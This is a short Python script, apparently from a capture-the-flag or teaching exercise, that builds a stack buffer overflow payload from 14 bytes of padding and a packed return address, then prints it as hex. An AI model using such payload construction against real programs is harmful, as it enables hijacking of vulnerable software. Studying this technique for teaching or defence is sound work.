import struct

# Return address we want to jump to
ret_addr = 0x00401156

# Padding to reach the return address
padding = b"A" * 14

# Pack the return address as a little-endian byte string
ret_addr_bytes = struct.pack("<I", ret_addr)

# Construct the payload by concatenating the padding and return address
payload = padding + ret_addr_bytes

# Print the payload as a hex string
print(payload.hex())